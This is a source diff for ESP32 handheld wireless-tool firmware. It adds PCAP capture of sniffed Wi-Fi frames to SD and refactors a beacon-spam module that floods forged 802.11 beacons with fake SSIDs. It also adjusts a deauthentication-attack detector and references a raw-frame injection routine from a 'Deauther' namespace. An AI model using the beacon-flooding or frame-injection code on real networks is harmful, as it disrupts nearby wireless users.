@@ -1,28 +1,258 @@
-#include "wificonfig.h"
-#include "shared.h"
-#include "icon.h"
+#include "KeyboardUI.h"
+#include "SettingsStore.h"
 #include "Touchscreen.h"
+#include "config.h"
+#include "esp_timer.h"
+#include "freertos/FreeRTOS.h"
+#include "freertos/queue.h"
+#include "freertos/task.h"
+#include "icon.h"
+#include "shared.h"
 
-/*
-   PacketMonitor
-   
-*/
+
+namespace Deauther {
+  extern void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size);
+}
+
+#ifdef TFT_BLACK
+#undef TFT_BLACK
+#endif
+#define TFT_BLACK FEATURE_BG
+
+#ifndef FEATURE_TEXT
+#define FEATURE_TEXT ORANGE
+#endif
+#ifndef FEATURE_WHITE
+#define FEATURE_WHITE 0xFFFF
+#endif
+
+#ifdef TFT_WHITE
+#undef TFT_WHITE
+#endif
+#define TFT_WHITE FEATURE_TEXT
+
+#ifdef WHITE
+#undef WHITE
+#endif
+#define WHITE FEATURE_WHITE
+
+#ifdef DARK_GRAY
+#undef DARK_GRAY
+#endif
+#define DARK_GRAY UI_FG
 
 namespace PacketMonitor {
 
 #define MAX_CH 14
 #define SNAP_LEN 2324
 
+static constexpr uint32_t PCAP_MAGIC_USEC = 0xa1b2c3d4;
+static constexpr uint16_t PCAP_VER_MAJOR = 2;
+static constexpr uint16_t PCAP_VER_MINOR = 4;
+static constexpr uint32_t PCAP_SNAPLEN   = 65535;
+static constexpr uint32_t PCAP_DLT_IEEE802_11_RADIO = 127;
+
+static constexpr uint16_t RADIOTAP_LEN = 19;
+static constexpr uint32_t RADIOTAP_PRESENT =
+  (1u << 1) |
+  (1u << 3) |
+  (1u << 5) |
+  (1u << 11) |
+  (1u << 19);
+
+struct __attribute__((packed)) RadiotapHdr16 {
+  uint8_t  it_version;
+  uint8_t  it_pad;
+  uint16_t it_len;
+  uint32_t it_present;
+  uint8_t  flags;
+  uint8_t  pad2;
+  uint16_t chan_freq;
+  uint16_t chan_flags;
+  int8_t   dbm_antsignal;
+  uint8_t  antenna;
+  uint8_t  mcs_known;
+  uint8_t  mcs_flags;
+  uint8_t  mcs;
+};
+
+struct __attribute__((packed)) PcapGlobalHeader {
+  uint32_t magic_number;
+  uint16_t version_major;
+  uint16_t version_minor;
+  int32_t  thiszone;
+  uint32_t sigfigs;
+  uint32_t snaplen;
+  uint32_t network;
+};
+
+struct __attribute__((packed)) PcapRecordHeader {
+  uint32_t ts_sec;
+  uint32_t ts_usec;
+  uint32_t incl_len;
+  uint32_t orig_len;
+};
+
+static bool  pcapEnabled = false;
+static bool  pcapMounted = false;
+static File  pcapFile;
+static String pcapPath;
+static uint32_t pcapPacketsWritten = 0;
+static uint32_t pcapDropped = 0;
+static uint32_t pcapLastFlushMs = 0;
+
+static constexpr uint8_t PCAP_POOL_SIZE = 10;
+struct PcapSlot {
+  PcapRecordHeader hdr;
+  uint16_t caplen;
+  uint8_t  data[SNAP_LEN + RADIOTAP_LEN];
+};
+static PcapSlot pcapPool[PCAP_POOL_SIZE];
+static QueueHandle_t pcapFreeQ = nullptr;
+static QueueHandle_t pcapWriteQ = nullptr;
+
+static bool pcapMountSD() {
+  if (pcapMounted) {
+    if (SD.exists("/")) return true;
+    pcapMounted = false;
+  }
+
+  #ifdef SD_CD
+  pinMode(SD_CD, INPUT_PULLUP);
+  if (digitalRead(SD_CD)) return false;
+  #endif
+
+  #ifdef SD_SCLK
+  #ifdef SD_MISO
+  #ifdef SD_MOSI
+  #ifdef SD_CS
+  SPI.begin(SD_SCLK, SD_MISO, SD_MOSI, SD_CS);
+  #endif
+  #endif
+  #endif
+  #endif
+
+  #ifdef SD_CS
+  if (SD.begin(SD_CS)) { pcapMounted = true; return true; }
+  #endif
+
+  #ifdef SD_CS_PIN
+  #ifdef CC1101_CS
+  if (SD_CS_PIN != CC1101_CS) {
+    if (SD.begin(SD_CS_PIN)) { pcapMounted = true; return true; }
+  }
+  #else
+  if (SD.begin(SD_CS_PIN)) { pcapMounted = true; return true; }
+  #endif
+  #endif
+
+  return false;
+}
+
+static bool pcapEnsureDir(const char* dirPath) {
+  if (!pcapMountSD()) return false;
+  if (SD.exists(dirPath)) return true;
+  if (SD.mkdir(dirPath)) return true;
+  if (dirPath && dirPath[0] == '/') return SD.mkdir(dirPath + 1);
+  return false;
+}
+
+static bool pcapMakeNextPath(String& outPath) {
+
+  for (uint16_t i = 0; i < 10000; i++) {
+    char buf[64];
+    snprintf(buf, sizeof(buf), "%s/ptm_%04u.pcap", CAPTURE_DIR, (unsigned)i);
+    if (!SD.exists(buf)) { outPath = String(buf); return true; }
+  }
+  return false;
+}
+
+static void pcapDisableAndCloseFile() {
+  pcapEnabled = false;
+
+  if (pcapWriteQ && pcapFreeQ) {
+    uint8_t slotIdx;
+    while (xQueueReceive(pcapWriteQ, &slotIdx, 0) == pdTRUE) {
+      xQueueSend(pcapFreeQ, &slotIdx, 0);
+    }
+  }
+
+  if (pcapFile) {
+    pcapFile.flush();
+    pcapFile.close();
+  }
+  pcapPath = "";
+}
+
+static void pcapStop() {
+  pcapDisableAndCloseFile();
+
+  if (pcapWriteQ) { vQueueDelete(pcapWriteQ); pcapWriteQ = nullptr; }
+  if (pcapFreeQ)  { vQueueDelete(pcapFreeQ);  pcapFreeQ  = nullptr; }
+
+  pcapPacketsWritten = 0;
+  pcapDropped = 0;
+  pcapLastFlushMs = 0;
+}
+
+static void pcapStart() {
+
+  pcapStop();
+
+  if (!pcapEnsureDir(CAPTURE_DIR)) return;
+  if (!pcapMakeNextPath(pcapPath)) return;
+
+  pcapFile = SD.open(pcapPath.c_str(), FILE_WRITE);
+  if (!pcapFile) { pcapPath = ""; return; }
+
+  PcapGlobalHeader gh{};
+  gh.magic_number = PCAP_MAGIC_USEC;
+  gh.version_major = PCAP_VER_MAJOR;
+  gh.version_minor = PCAP_VER_MINOR;
+  gh.thiszone = 0;
+  gh.sigfigs = 0;
+  gh.snaplen = PCAP_SNAPLEN;
+  gh.network = PCAP_DLT_IEEE802_11_RADIO;
+  if (pcapFile.write((const uint8_t*)&gh, sizeof(gh)) != sizeof(gh)) {
+    pcapFile.close();
+    pcapPath = "";
+    return;
+  }
+
+  pcapFreeQ = xQueueCreate(PCAP_POOL_SIZE, sizeof(uint8_t));
+  pcapWriteQ = xQueueCreate(PCAP_POOL_SIZE, sizeof(uint8_t));
+  if (!pcapFreeQ || !pcapWriteQ) {
+    pcapStop();
+    return;
+  }
+
+  for (uint8_t i = 0; i < PCAP_POOL_SIZE; i++) {
+    xQueueSend(pcapFreeQ, &i, 0);
+  }
+
+  pcapEnabled = true;
+  pcapLastFlushMs = millis();
+}
+
+static uint16_t pcapChannelToFreqMHz(uint8_t channel) {
+  if (channel == 14) return 2484;
+  if (channel >= 1 && channel <= 13) return (uint16_t)(2407 + channel * 5);
+
+  if (channel >= 32) return (uint16_t)(5000 + channel * 5);
+  return 0;
+}
+
+static uint16_t pcapChannelFlags(uint16_t freqMHz) {
+
+  if (freqMHz >= 2400 && freqMHz < 2500) return 0x0080;
+  if (freqMHz >= 4900 && freqMHz < 6000) return 0x0100;
+  return 0;
+}
+
 #define MAX_X 240
 #define MAX_Y 320
 
 arduinoFFT FFT = arduinoFFT();
-
-#define BTN_UP     6
-#define BTN_DOWN   3
-#define BTN_LEFT   4
-#define BTN_RIGHT  5
-#define BTN_SELECT 7
 
 bool btnLeftPressed = false;
 bool btnRightPressed = false;
@@ -55,7 +285,6 @@ int rssiSum;
 unsigned int epoch = 0;
 unsigned int color_cursor = 2016;
 
-
 void do_sampling_FFT() {
 
   microseconds = micros();
@@ -68,7 +297,6 @@ void do_sampling_FFT() {
     }
     microseconds += sampling_period_us;
   }
-
 
   double mean = 0;
 
@@ -84,16 +312,15 @@ void do_sampling_FFT() {
   FFT.Compute(vReal, vImag, samples, FFT_FORWARD);
   FFT.ComplexToMagnitude(vReal, vImag, samples);
 
-
   unsigned int left_x = 120;
   unsigned int graph_y_offset = 91;
   int max_k = 0;
 
   for (int j = 0; j < samples >> 1; j++) {
-    int k = vReal[j] / attenuation; // Scale the value
+    int k = vReal[j] / attenuation;
     if (k > max_k)
-      max_k = k; // Track the maximum value for potential scaling
-    if (k > 127) k = 127; // Cap the value to the palette limit
+      max_k = k;
+    if (k > 127) k = 127;
 
     unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
     unsigned int vertical_x = left_x + j;
@@ -124,7 +351,9 @@ void do_sampling_FFT() {
     if (k > 127) k = 127;
 
     unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
-    int current_y = area_graph_height - map(k, 0, 127, 0, area_graph_height) + area_graph_y_offset;
+    int current_y = area_graph_height
+              - (int)::map(k, 0, 127, 0, area_graph_height)
+              + area_graph_y_offset;
     unsigned int x = area_graph_x_offset + j;
 
     if (j > 0) {
@@ -133,7 +362,6 @@ void do_sampling_FFT() {
     }
     last_y[j] = current_y;
   }
-
 
   unsigned int area_graph_width = (samples >> 1);
   unsigned int area_graph_x_offset_flipped = -7;
@@ -145,7 +373,9 @@ void do_sampling_FFT() {
     if (k > 127) k = 127;
 
     unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
-    int current_y = area_graph_height - map(k, 0, 127, 0, area_graph_height) + area_graph_y_offset;
+    int current_y = area_graph_height
+              - (int)::map(k, 0, 127, 0, area_graph_height)
+              + area_graph_y_offset;
     unsigned int x = area_graph_x_offset_flipped + area_graph_width - j - 1;
 
     if (j > 0) {
@@ -199,11 +429,77 @@ void wifi_promiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (type == WIFI_PKT_MISC) return;
   if (ctrl.sig_len > SNAP_LEN) return;
 
-  uint32_t packetLength = ctrl.sig_len;
-
-  if (type == WIFI_PKT_MGMT) packetLength -= 4;
+  const uint16_t packetLength = (uint16_t)ctrl.sig_len;
   tmpPacketCounter++;
   rssiSum += ctrl.rssi;
+
+  if (!pcapEnabled || !pcapFile || !pcapFreeQ || !pcapWriteQ) return;
+
+  uint8_t slotIdx;
+  if (xQueueReceive(pcapFreeQ, &slotIdx, 0) != pdTRUE) {
+    pcapDropped++;
+    return;
+  }
+
+  if (slotIdx >= PCAP_POOL_SIZE) {
+
+    pcapDropped++;
+    return;
+  }
+
+  PcapSlot& s = pcapPool[slotIdx];
+
+  const int64_t nowUs = esp_timer_get_time();
+  s.hdr.ts_sec  = (uint32_t)(nowUs / 1000000LL);
+  s.hdr.ts_usec = (uint32_t)(nowUs % 1000000LL);
+
+  const uint16_t freq = pcapChannelToFreqMHz((uint8_t)ctrl.channel);
+  RadiotapHdr16 rt{};
+  rt.it_version = 0;
+  rt.it_pad = 0;
+  rt.it_len = RADIOTAP_LEN;
+  rt.it_present = RADIOTAP_PRESENT;
+  rt.flags = 0;
+  rt.pad2 = 0;
+  rt.chan_freq = freq;
+  rt.chan_flags = pcapChannelFlags(freq);
+  rt.dbm_antsignal = (int8_t)ctrl.rssi;
+  rt.antenna = 0;
+  rt.mcs_known = 0;
+  rt.mcs_flags = 0;
+  rt.mcs = 0;
+
+  if (ctrl.sig_mode == 1) {
+
+    rt.mcs_known =
+      (1u << 0) |
+      (1u << 1) |
+      (1u << 2) |
+      (1u << 4) |
+      (1u << 5);
+
+    const uint8_t bw = (ctrl.cwb ? 1 : 0);
+    rt.mcs_flags |= (bw & 0x3);
+    if (ctrl.sgi) rt.mcs_flags |= (1u << 2);
+    if (ctrl.fec_coding) rt.mcs_flags |= (1u << 4);
+    if (ctrl.stbc) rt.mcs_flags |= (1u << 5);
+
+    rt.mcs = ctrl.mcs;
+  }
+
+  const uint16_t totalLen = (uint16_t)(RADIOTAP_LEN + packetLength);
+  s.hdr.incl_len = totalLen;
+  s.hdr.orig_len = totalLen;
+  s.caplen = totalLen;
+  memcpy(s.data, &rt, RADIOTAP_LEN);
+  memcpy(s.data + RADIOTAP_LEN, pkt->payload, packetLength);
+
+  if (xQueueSend(pcapWriteQ, &slotIdx, 0) != pdTRUE) {
+
+    xQueueSend(pcapFreeQ, &slotIdx, 0);
+    pcapDropped++;
+    return;
+  }
 }
 
 void setChannel(int newChannel) {
@@ -243,12 +539,10 @@ void runUI() {
   static int iconY = STATUS_BAR_Y_OFFSET;
 
   static const unsigned char* icons[ICON_NUM] = {
-    bitmap_icon_sort_up_plus,  // Icon 0: Increase channel
-    bitmap_icon_sort_down_minus, // Icon 1: Decrease channel
-    bitmap_icon_go_back // Added back icon
+    bitmap_icon_sort_up_plus,
+    bitmap_icon_sort_down_minus,
+    bitmap_icon_go_back
   };
-
-  // Draw UI elements only once unless needed
 
   if (!uiDrawn) {
     tft.fillRect(160, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 160, STATUS_BAR_HEIGHT, DARK_GRAY);
@@ -261,9 +555,8 @@ void runUI() {
     uiDrawn = true;
   }
 
-  // Non-blocking animation state machine
   static unsigned long lastAnimationTime = 0;
-  static int animationState = 0;  // 0: idle, 1: black, 2: white
+  static int animationState = 0;
   static int activeIcon = -1;
 
   if (animationState > 0 && millis() - lastAnimationTime >= 150) {
@@ -277,31 +570,30 @@ void runUI() {
     lastAnimationTime = millis();
   }
 
-  // Throttle touchscreen polling
   static unsigned long lastTouchCheck = 0;
-  const unsigned long touchCheckInterval = 50;  // Check every 50ms
+  const unsigned long touchCheckInterval = 50;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
-    if (ts.touched() && feature_active) {
-      TS_Point p = ts.getPoint();
-      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-      int y = ::map(p.y, 3800, 300, 0, SCREEN_HEIGHT - 1);
-
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
       if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
         for (int i = 0; i < ICON_NUM; i++) {
           if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
             if (icons[i] != NULL && animationState == 0) {
-              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
-              animationState = 1;
-              activeIcon = i;
-              lastAnimationTime = millis();
 
-              switch (i) {
-                case 0: setChannel(ch + 1); break;  // Increase channel
-                case 1: setChannel(ch - 1); break;  // Decrease channel
-                case 2: // Back icon action (exit to submenu)
-                    feature_exit_requested = true;
-                 break;
+              if (i == 2) {
+                feature_exit_requested = true;
+              } else {
+
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+
+                switch (i) {
+                  case 0: setChannel(ch + 1); break;
+                  case 1: setChannel(ch - 1); break;
+                }
               }
             }
             break;
@@ -357,29 +649,84 @@ void ptmSetup() {
   nvs_flash_init();
   tcpip_adapter_init();
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-  //ESP_ERROR_CHECK(esp_event_loop_init(event_handler, NULL));
+
   ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-  //ESP_ERROR_CHECK(esp_wifi_set_country(WIFI_COUNTRY_EU));
+
   ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
   ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
   ESP_ERROR_CHECK(esp_wifi_start());
 
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
 
   uiDrawn = false;
   tft.fillRect(0, 20, 160, 16, DARK_GRAY);
+
+  pcapStart();
+  if (pcapEnabled && pcapPath.length()) {
+    Serial.printf("[PCAP] PacketMonitor logging to SD: %s\n", pcapPath.c_str());
+  } else {
+    Serial.println("[PCAP] PacketMonitor: SD/PCAP logging not started (no SD or open failed).");
+  }
 }
 
 void ptmLoop() {
 
+  if (feature_active && isButtonPressed(BTN_SELECT)) {
+
+    esp_wifi_set_promiscuous(false);
+    if (pcapPacketsWritten || pcapDropped) {
+      Serial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
+                    (unsigned long)pcapPacketsWritten, (unsigned long)pcapDropped);
+    }
+    pcapStop();
+    feature_exit_requested = true;
+    return;
+  }
+
   runUI();
+  if (feature_exit_requested) {
+    esp_wifi_set_promiscuous(false);
+    if (pcapPacketsWritten || pcapDropped) {
+      Serial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
+                    (unsigned long)pcapPacketsWritten, (unsigned long)pcapDropped);
+    }
+    pcapStop();
+    return;
+  }
   updateStatusBar();
 
   esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
 
   esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
   esp_wifi_set_promiscuous(true);
+
+  if (pcapEnabled && pcapFile && pcapWriteQ && pcapFreeQ) {
+    uint8_t slotIdx;
+
+    uint16_t drained = 0;
+    while (drained < 12 && xQueueReceive(pcapWriteQ, &slotIdx, 0) == pdTRUE) {
+      if (slotIdx < PCAP_POOL_SIZE) {
+        PcapSlot& s = pcapPool[slotIdx];
+        const size_t wroteHdr = pcapFile.write((const uint8_t*)&s.hdr, sizeof(s.hdr));
+        const size_t wrotePkt = pcapFile.write(s.data, s.caplen);
+        if (wroteHdr == sizeof(s.hdr) && wrotePkt == s.caplen) {
+          pcapPacketsWritten++;
+        } else {
+
+          pcapDisableAndCloseFile();
+        }
+      }
+      xQueueSend(pcapFreeQ, &slotIdx, 0);
+      drained++;
+    }
+
+    const uint32_t now = millis();
+    if (pcapFile && (now - pcapLastFlushMs) > 1000) {
+      pcapFile.flush();
+      pcapLastFlushMs = now;
+    }
+  }
 
   tft.drawLine(0, 90, 240, 90, TFT_WHITE);
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
@@ -423,20 +770,7 @@ void ptmLoop() {
   }
 }
 
-
-/*
-   BeaconSpammer
-
-
-*/
-
 namespace BeaconSpammer {
-
-#define BTN_UP     6
-#define BTN_DOWN   3
-#define BTN_LEFT   4
-#define BTN_RIGHT  5
-#define BTN_SELECT 7
 
 bool btnLeftPress;
 bool btnRightPress;
@@ -458,8 +792,11 @@ String ssidList[] = {
 const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);
 
 uint8_t spamchannel = 1;
-bool spam = false;
-int y_offset = 20;
+bool    spam        = false;
+int     y_offset    = 20;
+
+static uint8_t lastSpamChannel = 0xFF;
+static bool    lastSpamState   = !false;
 
 uint8_t packet[128] = {0x80, 0x00, 0x00, 0x00,
                        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
@@ -507,7 +844,7 @@ void output() {
   tft.print("[*] Configuring channel to ");
   tft.setTextColor(TFT_CYAN, TFT_BLACK);
   tft.print("(");
-  tft.setTextColor(TFT_RED, TFT_BLACK);
+  tft.setTextColor(UI_WARN, TFT_BLACK);
   tft.print(spamchannel);
   tft.setTextColor(TFT_CYAN, TFT_BLACK);
   tft.print(")");
@@ -568,27 +905,27 @@ void beaconSpam() {
     String ssid = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
     byte channel;
 
-    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 
-                            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
+    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00,
+                            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                             0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
-                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
-                            0xc0, 0x6c, 
-                            0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
-                            0x64, 0x00, 
-                            0x01, 0x04, 
+                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+                            0xc0, 0x6c,
+                            0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
+                            0x64, 0x00,
+                            0x01, 0x04,
                             0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                             0x01, 0x08, 0x82, 0x84,
-                            0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 
+                            0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
                             0x04};
 
     tft.setTextFont(1);
     tft.setTextSize(1);
-    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.setTextColor(UI_WARN, TFT_BLACK);
     tft.fillRect(0, 40, tft.width(), tft.height(), TFT_BLACK);
     tft.setCursor(2, 30 + y_offset);
     tft.print("[!!] FUCK IT");
     tft.setCursor(2, 50 + y_offset);
-    tft.print("[!!] Press [Select] to exit");                        
+    tft.print("[!!] Press [Select] to exit");
 
     delay(500);
 
@@ -624,7 +961,7 @@ void beaconSpam() {
     }
 
     while (true) {
-        channel = random(1, 13);  
+        channel = random(1, 13);
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
         for (int i = 10; i <= 15; i++) {
@@ -657,12 +994,12 @@ void beaconSpam() {
             Serial.printf("Packet 3 send failed: %d\n", result);
         }
 
-        delay(1); 
-        
+        delay(1);
+
       if (pcf.digitalRead(BTN_SELECT) == LOW) {
         break;
       }
-         
+
     }
 }
 
@@ -680,11 +1017,11 @@ void runUI() {
   static int iconY = STATUS_BAR_Y_OFFSET;
 
   static const unsigned char* icons[ICON_NUM] = {
-    bitmap_icon_sort_down_minus,  
-    bitmap_icon_sort_up_plus,     
-    bitmap_icon_start,             
+    bitmap_icon_sort_down_minus,
+    bitmap_icon_sort_up_plus,
+    bitmap_icon_start,
     bitmap_icon_nuke,
-    bitmap_icon_go_back // Added back icon
+    bitmap_icon_go_back
   };
 
   if (!uiDrawn) {
@@ -699,15 +1036,15 @@ void runUI() {
   }
 
   static unsigned long lastAnimationTime = 0;
-  static int animationState = 0;  
+  static int animationState = 0;
   static int activeIcon = -1;
   static unsigned long lastSpamTime = 0;
 
   switch (animationState) {
-    case 0: 
+    case 0:
       break;
 
-    case 1: 
+    case 1:
       if (millis() - lastAnimationTime >= 150) {
         tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
         animationState = 2;
@@ -722,7 +1059,7 @@ void runUI() {
       }
       break;
 
-    case 3: 
+    case 3:
       switch (activeIcon) {
         case 0:
           handleLeftButton();
@@ -737,7 +1074,7 @@ void runUI() {
         case 2:
           handleSelectButton();
           if (spam) {
-            animationState = 4;  
+            animationState = 4;
           } else {
             animationState = 0;
             activeIcon = -1;
@@ -749,7 +1086,7 @@ void runUI() {
           activeIcon = -1;
           break;
 
-         case 4: // Back icon action (exit to submenu)
+         case 4:
            feature_exit_requested = true;
            animationState = 0;
            activeIcon = -1;
@@ -757,16 +1094,16 @@ void runUI() {
       }
       break;
 
-    case 4: 
+    case 4:
       if (spam) {
         if (millis() - lastSpamTime >= 50) {
           spammer();
-          
-          if (activeIcon = 3) { 
+
+          if (activeIcon = 3) {
             output();
           }
           if (activeIcon = 3) {
-            animationState = 5;  
+            animationState = 5;
           }
           lastSpamTime = millis();
         }
@@ -776,7 +1113,7 @@ void runUI() {
       }
       break;
 
-    case 5: 
+    case 5:
       if (millis() - lastSpamTime >= 50) {
         animationState = 0;
         activeIcon = -1;
@@ -785,22 +1122,25 @@ void runUI() {
   }
 
   static unsigned long lastTouchCheck = 0;
-  const unsigned long touchCheckInterval = 50;  
+  const unsigned long touchCheckInterval = 50;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
-    if (ts.touched() && feature_active) {
-      TS_Point p = ts.getPoint();
-      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);
-
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
       if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
         for (int i = 0; i < ICON_NUM; i++) {
           if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
             if (icons[i] != NULL && animationState == 0) {
-              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
-              animationState = 1;
-              activeIcon = i;
-              lastAnimationTime = millis();
+
+              if (i == 4) {
+                feature_exit_requested = true;
+              } else {
+
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
             }
             break;
           }
@@ -847,13 +1187,21 @@ void beaconSpamSetup() {
   tft.print("[!] Press [UP] to start");
 
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
+
+  lastSpamChannel = 0xFF;
+  lastSpamState   = !spam;
 
   uiDrawn = false;
   tft.fillRect(0, 20, 120, 16, DARK_GRAY);
 }
 
 void beaconSpamLoop() {
+
+  if (feature_active && isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+    return;
+  }
 
   runUI();
   updateStatusBar();
@@ -879,51 +1227,49 @@ void beaconSpamLoop() {
     delay(200);
   }
 
-  tft.setTextFont(1);
-  tft.fillRect(35, 20, 95, 16, DARK_GRAY);
-  tft.setTextColor(TFT_WHITE);
-  tft.setTextSize(1);
-  tft.setCursor(35, 24);
-  tft.print("Ch:");
-  tft.print(spamchannel);
+  if (lastSpamChannel != spamchannel || lastSpamState != spam) {
+    tft.setTextFont(1);
+    tft.fillRect(35, 20, 95, 16, DARK_GRAY);
+    tft.setTextColor(TFT_WHITE, DARK_GRAY);
+    tft.setTextSize(1);
 
-  tft.setCursor(70, 24);
-  tft.print(spam ? "Enabled " : "Disabled");
+    tft.setCursor(35, 24);
+    tft.print("Ch:");
+    tft.print(spamchannel);
 
+    tft.setCursor(70, 24);
+    tft.print(spam ? "Enabled " : "Disabled");
 
-    while (spam) {
-      spammer();
-  
-      if (btnSelectPress) {
-        output();
-      }
-  
-      if (pcf.digitalRead(BTN_UP)) {
-        delay(50);
-        break;
-      }
-    } 
+    lastSpamChannel = spamchannel;
+    lastSpamState   = spam;
+  }
+
+  while (spam) {
+    runUI();
+    if (feature_exit_requested) {
+      spam = false;
+      break;
+    }
+
+    spammer();
+
+    if (btnSelectPress) {
+      output();
+    }
+
+    if (pcf.digitalRead(BTN_UP)) {
+      delay(50);
+      break;
+    }
   }
 }
-
-
-/*
-   DeauthDetect
-
-
-*/
+}
 
 namespace DeauthDetect {
 
 #define SCREEN_HEIGHT 280
 #define LINE_HEIGHT 12
 #define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)
-
-#define BTN_UP     6
-#define BTN_DOWN   3
-#define BTN_LEFT   4
-#define BTN_RIGHT  5
-#define BTN_SELECT 7
 
 #define MAX_NETWORKS 50
 #define MAX_CHANNELS 14
@@ -957,7 +1303,7 @@ static int iconX[ICON_NUM] = {210, 10};
 static int iconY = STATUS_BAR_Y_OFFSET;
 static const unsigned char* icons[ICON_NUM] = {
   bitmap_icon_power,
-  bitmap_icon_go_back // Added back icon
+  bitmap_icon_go_back
 };
 
 void scrollTerminal() {
@@ -999,8 +1345,8 @@ void checkButtonPress() {
     if (!stopScan) {
       stopScan = true;
       xSemaphoreTake(tftSemaphore, portMAX_DELAY);
-      displayPrint("[!] Scanning Stopped", TFT_RED, true);
-      displayPrint("[!] Press [Select] to Exit", TFT_RED, false);
+      displayPrint("[!] Scanning Stopped", UI_WARN, true);
+      displayPrint("[!] Press [Select] to Exit", UI_WARN, false);
       xSemaphoreGive(tftSemaphore);
     } else {
       exitMode = true;
@@ -1025,7 +1371,7 @@ void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
         if (memcmp(senderMAC, macList[i], 6) == 0) {
           deauth[i]++;
           xSemaphoreTake(tftSemaphore, portMAX_DELAY);
-          displayPrint("[!] Deauth Attack on: " + ssidLists[i], TFT_RED, true);
+          displayPrint("[!] Deauth Attack on: " + ssidLists[i], UI_WARN, true);
           xSemaphoreGive(tftSemaphore);
           break;
         }
@@ -1072,7 +1418,7 @@ void analyzeNetworks(int n) {
 
     if (deauth[i] > 5) {
       xSemaphoreTake(tftSemaphore, portMAX_DELAY);
-      displayPrint("[!!!] HIGH DEAUTH ATTACK on " + ssidLists[i] + " (" + String(deauth[i]) + " attacks)", TFT_RED, true);
+      displayPrint("[!!!] HIGH DEAUTH ATTACK on " + ssidLists[i] + " (" + String(deauth[i]) + " attacks)", UI_WARN, true);
       xSemaphoreGive(tftSemaphore);
     }
   }
@@ -1134,16 +1480,15 @@ void scanWiFiTask(void *param) {
 
 static bool uiDrawn = false;
 
-void runUI() {   
-  
+void runUI() {
+
     tft.drawLine(0, 19, 240, 19, TFT_WHITE);
-    
+
     static const unsigned char* icons[ICON_NUM] = {
-        bitmap_icon_start,  // Icon 0: Stop scan
-        bitmap_icon_go_back // Added back icon
+        bitmap_icon_start,
+        bitmap_icon_go_back
     };
 
-    // Redraw UI elements when entering mode
     if (!uiDrawn) {
         tft.setTextFont(1);
         tft.fillRect(0, 20, 140, 16, DARK_GRAY);
@@ -1154,19 +1499,18 @@ void runUI() {
 
         tft.drawLine(0, 19, 240, 19, TFT_WHITE);
         tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);
-        
+
         for (int i = 0; i < ICON_NUM; i++) {
-            if (icons[i] != NULL) {  
+            if (icons[i] != NULL) {
                 tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
